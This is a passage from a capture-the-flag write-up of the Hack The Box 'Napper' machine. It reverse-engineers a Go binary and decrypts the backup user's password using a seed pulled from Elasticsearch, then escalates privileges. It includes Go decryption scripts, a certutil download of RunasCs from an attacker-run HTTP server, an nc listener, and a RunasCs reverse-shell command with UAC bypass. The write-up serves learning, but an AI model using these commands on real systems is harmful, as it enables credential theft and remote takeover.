
> **main.go**

```go
package main

import(
  "fmt"
  "math/rand"
)

func genKey(seed int64) []byte {
  rand.Seed(seed)

  key := make([]byte, 16)

  for i:=0; i < 16; i++ {
    key[i] = byte(rand.Intn(254) + 1)
  }

  return key
}

func main() {
  seed := int64(123123)
  key := genKey(seed)

  fmt.Printf("Key value -> %x\n", key)
}
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_077.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_078.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_079.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_080.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_081.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_082.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue advancing, and the code becomes a little clearer, there is an **`encrypt`** function to which two values are passed - a **random** one and the **seed** - in charge of generating the encrypted string (password of the `backup` user most probably). In this function I can see the `crypto/cipher` package of **Go** in charge of generating an encrypted string, as well as the mode used (**[CFB](https://xilinx.github.io/Vitis_Libraries/security/2019.2/guide_L1/internals/cfb.html){:target="_blank"}**) and the initialization vector **IV**. Following the flow of the `main` program I can observe at what point the document is updated in the **Elasticsearch** database (**blob**) and then I find different variables that are related to the execution of a command with `cmd.exe`. It all makes sense.

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_083.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_084.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_085.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_086.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_087.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_088.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_089.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_090.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There are excellent extensions for **Ghidra** such as **[Ghostrings](https://github.com/nccgroup/ghostrings){:target="_blank"}**, which allow me to better analyze the code in **Go**, once I download the **.zip** file and install it I can clearly see the command being executed. With all the information I collected so far I have a clearer idea about the purpose of the binary I found and debugged: it <ins>loads the environment variables</ins> it needs, <ins>generates an encrypted password</ins>, <ins>updates the Elasticsearch database</ins> and then makes a system call that will <ins>execute a command with **cmd.exe** to update the `backup` user's password</ins>. I can now create a custom script to decrypt the password, I just need to get the seed with `curl` and then with the necessary **Go** packages I get the decrypted string.

```bash
mv /home/al3j0/Downloads/ghidra_11.0.1_PUBLIC_20240204_GolangAnalyzerExtension.zip .
nvim main.go
go run main.go
```

> **main.go**

```go
package main

import(
  "fmt"
  "os/exec"       // Command execution
  "strings"
  "strconv"
  "math/rand"
  "encoding/base64"
  "crypto/aes"
  "crypto/cipher"
)

func getSeed() (int64, string, error) {
  cmd := exec.Command(
    "curl",
    "-s", "-k", "-X", "GET",
    "https://user:DumpPassword$Here@127.0.0.1:9200/_search?pretty=true",
  )

  output, err := cmd.CombinedOutput()     // Return two values: deciaml && error code

  if err != nil {
    fmt.Println("Unsuccessful command execution:", err)
    return 0, "", err
  }

  //output, _ := cmd.CombinedOutput()
  // fmt.Println(string(output))
  outputLines := strings.Split(string(output), "\n")

  var seedStr string

  for _, line := range outputLines {
    if strings.Contains(line, "seed") && !strings.Contains(line, "index") {
      seedStr = strings.TrimSpace(strings.Split(line, ":")[1])
      break
    }
  }

  seed, err := strconv.ParseInt(seedStr, 10, 64)    // String --> Integer (base 10, 64 bytes)
  
  if err != nil {
    fmt.Println("Erron in data type conversion:", err)
    return 0, "", err
  }

  var blob string

  for _, line := range outputLines {
    if strings.Contains(line, "blob") {
      line = strings.Split(line, ":")[1]
      blob = strings.Split(line, "\"")[1]
      break
    }
  }

  return seed, blob, err

  //fmt.Println(outputLines)

}

func genKey(seed int64) []byte {
  rand.Seed(seed)

  key := make([]byte, 16)

  for i := 0; i < 16; i++ {
    key[i] = byte(rand.Intn(254) + 1)
  }

  return key
}

func decryptCFB(iv, ciphertext, key []byte) []byte  {
  
  block, _ := aes.NewCipher(key)

  plaintext := make([]byte, len(ciphertext))

  stream := cipher.NewCFBDecrypter(block, iv)
  stream.XORKeyStream(plaintext, ciphertext)

  return plaintext
}

func main() {
  seed, encryptedBlob, _ := getSeed()
  key := genKey(seed)
  decodedBlob, err := base64.URLEncoding.DecodeString(encryptedBlob)

  if err != nil {
    fmt.Println("Base64 decoding error:", err)
    return
  }

  iv := decodedBlob[:aes.BlockSize]     // 16 first bytes
  encryptedData := decodedBlob[aes.BlockSize:]    // Encrypted message

  decryptedData := decryptCFB(iv, encryptedData, key)   // backup user password

  fmt.Println("Seed value -> ", seed)
  fmt.Println("Blob value -> ", encryptedBlob)
  fmt.Printf("Key -> %x\n", key)
  //fmt.Println(string(decodedBlob))
  fmt.Println("backup user password -> ", string(decryptedData))
}
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_091.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_092.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_093.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_094.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_095.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There are many resources on the **Internet**, such as **[encrypt_decrypt.go](https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865){:target="_blank"}**, that just by **searching**, **downloading** and **adapting** them would have saved me a lot of time, but here is the decision of each one, to <ins>learn more concepts or just use automated tools and miss out on learning many more things that we will surely take advantage of at some point</ins>. Now that I already have a script to obtain the updated password of the `backup` user, I am going to use the **[RunasCs](https://github.com/antonioCoco/RunasCs){:target="_blank"}** utility to execute a process as the `backup` user using his password, this way I am going to send me a **Reverse Shell**. I just need to transfer **[RunasCs](https://github.com/antonioCoco/RunasCs){:target="_blank"}** to the victim machine, run my script in **Go** to get an updated password, open a port with `nc` waiting for a connection to get the **Reverse Shell** and run **[RunasCs](https://github.com/antonioCoco/RunasCs){:target="_blank"}** with the recommended parameters and I can migrate the user `backup` to access the last flag.

> **Attacker Machine:**

```bash
nvim decrypt_text.go

go run decrypt_text.go
go run decrypt_text.go -seed=51618111 -data="iTMDfUnQUVGVLsVSoNye7AN948Tyw-4FbvvSpwGsBrh2PfHQ4XY79daQQeai5IQxDHQUAgpvUXQ="
```

> **decrypt_text.go**

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"flag"
	"fmt"
	"math/rand"
)

func genKey(seed int64) []byte {
	rand.Seed(seed)
	key := make([]byte, 16)
	for i := range key {
		key[i] = byte(rand.Intn(254) + 1)
	}
	return key
}


func decrypt(seed int64, encryptedBase64 string) (string, string, error) {

	key := genKey(seed)

	encryptedData, err := base64.URLEncoding.DecodeString(encryptedBase64)
	if err != nil {
		return "", "", fmt.Errorf("base64 decode: %w", err)
	}

	iv := encryptedData[:aes.BlockSize]
	encryptedText := encryptedData[aes.BlockSize:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", "", fmt.Errorf("new cipher: %w", err)
	}

	stream := cipher.NewCFBDecrypter(block, iv)
	decrypted := make([]byte, len(encryptedText))
	stream.XORKeyStream(decrypted, encryptedText)

	return string(decrypted), string(key), nil
}

func main() {

	seedPtr := flag.Int64("seed", 0, "Seed used to generate the encryption key")
	encryptedBase64Ptr := flag.String("data", "", "Base64-encoded encrypted data to decrypt")

	flag.Parse()

	if *seedPtr == 0 || *encryptedBase64Ptr == "" {
		fmt.Println("Usage: go run decrypt_text.go -seed=<seed> -data=\"<encrypted data>\"")
		return
	}

	decryptedText, key1, err := decrypt(*seedPtr, *encryptedBase64Ptr)
	if err != nil {
		fmt.Println("Decryption error:", err)
		return
	}

	fmt.Println("Decrypted text: ", decryptedText, key1)
}
```

```bash
mv ~/Downloads/RunasCs.zip .
7z l RunasCs.zip
unzip RunasCs.zip -d Runas
mv ./Runas/RunasCs.exe Runas.exe
python3 -m http.server 80
```

> **Victime Machine:**

```cmd
certutil -urlcache -f -split http://10.10.14.16/Runas.exe
```

> **Attacker Machine:**

```bash
rlwrap nc -nlvp 443
```

> **Victime Machine:**

```cmd
.\Runas.exe backup LPPHVSVqhLMBZbAiehmyKlqMCmXptyliefMzETwP cmd.exe -r 10.10.14.16:443 --bypass-uac --logon-type 8
# :)
```

> **Attacker Machine:**

```cmd
whoami
#     napper\backup
```

<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_096.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_097.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_098.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_099.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_100.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/napper_writeup/Napper_101.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It is the second **Hard** machine of which I do a **Writeup**, I continue with the collaboration of <ins>many people who selflessly share their knowledge and time</ins>, something invaluable for someone who starts this beautiful field of **Ethical Hacking**. The new concepts, tools, programming languages, protocols, etc. that I am getting to know make me love this field more and more every day. **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** makes my learning an activity more like a beautiful game to do than a tedious and repetitive activity. I'm going to kill the box and move on to the next one on my list.

<br /><br />
<img src="{{ site.img_path }}/napper_writeup/Napper_102.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
